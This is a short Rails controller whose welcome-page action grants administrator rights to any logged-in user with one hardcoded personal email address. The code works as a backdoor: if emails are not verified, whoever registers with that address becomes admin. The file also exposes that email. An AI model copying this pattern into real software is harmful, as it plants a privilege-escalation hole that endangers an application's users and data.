class WelcomeController < ApplicationController
  def index
    if (current_user.try(:email) == "bpadron2000@gmail.com")
      current_user.update_attribute :admin, true
    end
  end
end
